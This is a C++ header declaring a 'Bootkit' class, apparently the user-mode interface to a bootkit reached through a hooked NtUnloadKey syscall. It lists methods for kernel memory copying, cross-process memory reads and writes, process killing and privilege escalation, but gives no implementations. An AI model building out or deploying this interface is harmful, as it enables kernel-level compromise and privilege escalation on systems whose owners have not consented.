#pragma once
#include "pch.h"

typedef uint64_t(NTAPI* NtUnloadKey_t)(uint64_t);

class Bootkit
{
public:
	Bootkit();
	uint64_t copy_kernel_memory(uint64_t address, uint64_t* buffer, uint64_t size);
	uint64_t write_process_memory(uint64_t pid, uint64_t address, uint64_t* buffer, uint64_t size);
	uint64_t read_process_memory(uint64_t pid, uint64_t address, uint64_t* buffer, uint64_t size);
	uint64_t kill_process(uint64_t pid);
	uint64_t privilege_escalation(uint64_t pid = (uint64_t)GetCurrentProcessId());
private:
	NtUnloadKey_t NtUnloadKey;
};